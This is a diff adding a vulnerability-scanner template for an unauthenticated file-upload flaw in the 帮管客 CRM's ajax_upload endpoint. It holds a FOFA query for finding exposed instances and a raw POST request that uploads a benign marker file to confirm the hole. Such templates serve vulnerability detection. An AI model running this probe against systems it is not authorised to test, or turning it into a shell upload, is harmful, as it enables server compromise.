@@ -1,0 +1,36 @@
+id: bangguanke-crm-file-upload
+
+info:
+  name: "帮管客 CRM ajax_upload_chat 及 ajax_upload 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="帮管客-CRM"
+        帮管客CRM为集成客户档案管理、销售流程追踪及业务交互功能的综合型客户关系管理平台。该系统通过ajax_upload_chat与ajax_upload接口实现文件传输功能，但未正确校验上传文件的合法性，导致攻击者可通过未授权访问利用此漏洞实现服务器控制权的攫取。
+  tags: 帮管客CRM
+
+http:
+- raw:
+  - |
+    POST /index.php/upload/ajax_upload HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o
+
+    ------WebKitFormBoundaryv1WbOn5o
+    Content-Disposition: form-data; name="file"; filename="NTest.txt"
+    Content-Type: image/jpeg
+
+    NdayTest
+    ------WebKitFormBoundaryv1WbOn5o--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
